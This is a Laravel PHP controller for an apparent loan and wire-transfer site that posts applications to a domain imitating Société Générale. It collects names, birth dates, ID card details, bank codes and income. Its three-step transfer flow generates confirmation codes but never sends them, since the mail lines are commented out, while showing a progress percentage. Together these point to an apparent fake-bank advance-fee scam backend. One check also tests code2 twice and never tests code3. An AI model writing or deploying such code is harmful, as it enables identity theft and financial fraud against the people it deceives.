<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Pret;
use App\Virement;
use App\Utilisateur;
use App\CodeConfirm;
use Illuminate\Support\Facades\Mail;
use App\Mail\PretMail;
use App\Mail\VirementMail;
use App\Mail\CodeMail;
use App\Mail\CodeMail2;
use App\Mail\CodeMail3;
use Illuminate\Support\Facades\Auth;

class OperationController extends Controller
{
    public function getLastVirement() {
        $virements = Virement::where('user_id', Auth::user()->id)->orderBy('created_at', 'desc')->limit(1)->get();
        return $virements[0];
    }

    public function pret()
    {
        if(Auth::user()) {
            return redirect()->route('front.virement');
        }
    	return view('front.operation');
    }

    public function pretPost(Request $request)
    {
    	request()->validate([
    		'nom'=>'required|max:50',
    		'prenom'=>'required|max:50',
    		'date_naissance'=>'required',
    		'telephone'=>'required',
    		'adresse'=>'required',
            'ville'=>'required',
    		'rolePret'=>'max:255',
            'pays'=>'required',
    		'idCard'=>'required',
    		'montantPret'=>'required',
    		'revenuAnnuel'=>'required',
    		'statutProfessionnel'=>'required',
    		'email'=>'required|email',
    	]);

        $pret = new Pret;

        $pret->nom = request('nom');
        $pret->prenom = request('prenom');
        $pret->devise = request('devise');
        $pret->deviseRevenu = request('deviseRevenu');
        $pret->date_naissance = request('date_naissance');
        $pret->telephone = request('telephone');
        $pret->adresse = request('adresse');
        $pret->ville = request('ville');
        $pret->region = request('region');
        $pret->pays = request('pays');
        $pret->codePostal = request('codePostal');
        $pret->montantPret = request('montantPret');
        $pret->rolePret = request('rolePret');
        $pret->revenuAnnuel = request('revenuAnnuel');
        $pret->nousConnaitre = request('nousConnaitre');
        $pret->statutProfessionnel = request('statutProfessionnel');
        $pret->email = request('email');
        $pret->idCard = request('idCard');
        $pret->codeBancaire = request('codeBancaire');
        $pret->delaiRemboursement = request('delaiRemboursement');

        $pret->save();

        Mail::to('infoline@oursocietygenerale.com')->send(new PretMail($request->except('_token')));

        $succes = 'Votre demande de prêt a été bien envoyé !';

        return back()->withSuccess($succes);
    }

    public function indexPrets()
    {
        $prets = Pret::all();

        return view('back.prets.list', compact('prets'));
    }

    public function store($id)
    {
        $pret = Pret::findOrFail($id);

        return view('back.prets.detail', compact('pret'));
    }

    public function virement()
    {
        if(auth()->guest()){
            return redirect()->route('front.login');
        }

        $virements = Virement::where('user_id', Auth::user()->id)->orderBy('created_at', 'desc')->limit(1)->get();

        if($virements->count() == 0) {
            $virement = new Virement;
            $virement->percent = 0;
        } else {
            if(!$virements[0]->code1 || !$virements[0]->code2 || !$virements[0]->code2) {
                $virement = $virements[0];
            } else {
                $virement = new Virement;
            $virement->percent = 0;
            }
        }

        $code = str_random(6);
        $virement->user_id = Auth::user()->id;
        $virement->code1 = $code;
        $virement->save();

        // Mail::to(auth()->user()->email)->send(new CodeMail($code));
        return view('front.virement');
    }

    public function virementPost(Request $request)
    {
        if(auth()->guest()){
            return redirect()->route('front.login');
        }
        request()->validate([
            'iban' => 'required',
            'bicswift' => 'required',
            'nameBanque' => 'required',
            'montant' => 'required',
            'code' =>'required',
            'devise' =>'required',
        ]);

        $virement = $this->getLastVirement();
        // dd($virement);
        if(request('code') != $virement->code1)
        {
            return redirect()->back()->withInput()->withErrors([
                'error' => ''
            ]);
        }

        $virement = $this->getLastVirement();
        $virement->iban = request('iban');
        $virement->bicswift = request('bicswift');
        $virement->nameBanque = request('nameBanque');
        $virement->montant = request('montant');
        $virement->devise = request('devise');

        $virement->save();

        return redirect()->route('front.virement2');
    }

    public function virement2()
    {
        $code = str_random(6);
        $virement = $this->getLastVirement();
        $virement->code2 = $code;
        $virement->save();

        // Mail::to(auth()->user()->email)->send(new CodeMail2($code));
        $percent =  $virement->percent;
        return view('front.virement2', compact('percent'));
    }

    public function virementPost2()
    {
        $virement = $this->getLastVirement();
        if (request('code2') == $virement->code2)
        {
            return redirect()->route('front.virement3');
        }
        else
        {
            return redirect()->back()->withErrors(['error' => '']);
        }
    }

    public function virement3()
    {
        $code = str_random(6);
        $virement = $this->getLastVirement();
        $virement->code3 = $code;
        $virement->save();

        // Mail::to(auth()->user()->email)->send(new CodeMail3($code));
        $percent =  $virement->percent;
        return view('front.virement3', compact('percent'));
    }

    public function virementPost3()
    {
        $virement = $this->getLastVirement();
        if (request('code3') == $virement->code3)
        {
            $percent =  $virement->percent;
            $finish = 0;

            return view('front.virement3', compact(['percent' ,'finish']));
        }
        else
        {
            return redirect()->back()->withErrors(['error' => '']);
        }
    }
}
